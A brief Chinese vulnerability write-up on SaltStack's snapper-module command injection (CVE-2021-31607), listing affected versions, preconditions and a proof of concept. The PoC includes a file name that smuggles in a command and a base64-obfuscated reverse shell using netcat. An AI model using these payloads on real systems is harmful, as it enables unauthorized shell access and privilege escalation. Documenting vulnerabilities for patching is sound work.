# SaltStack Minion 命令注入漏洞 CVE-2021-31607

## 漏洞描述

2021年4月28日，深信服安全团队监测到一则Salt组件存在 SaltStack Minion 命令注入漏洞的信息，漏洞编号：CVE-2021-31607，漏洞威胁等级：中危。

该漏洞是由于在SaltStack Salt 2016.9至3002.6中，快照程序模块中存在一个命令注入漏洞，攻击者可利用该漏洞获得权限的情况下，对一个分支系统的本地特权进行升级。

参考阅读：

* https://sec.stealthcopter.com/saltstack-snapper-minion-privledge-escaltion/
* https://nvd.nist.gov/vuln/detail/CVE-2021-31607
* https://nox.qianxin.com/vulnerability/detail/97347

## 漏洞影响

```
2016.9 ≤ SaltStack Salt ≤ 3002.6
```

## 漏洞复现

利用条件 : 

1. 用户认证：需要用户认证
2. 前置条件：配置了快照程序，使用snapper模块
3. 触发方式：本地

poc：

```
echo hi > '$(touch HACKED).txt'
反弹shell：
echo hi > '$(echo bmMgLWUgL2Jpbi9iYXNoIDEyNy4wLjAuMSA0NDQ0|base64 -d|sh -i).txt'
```

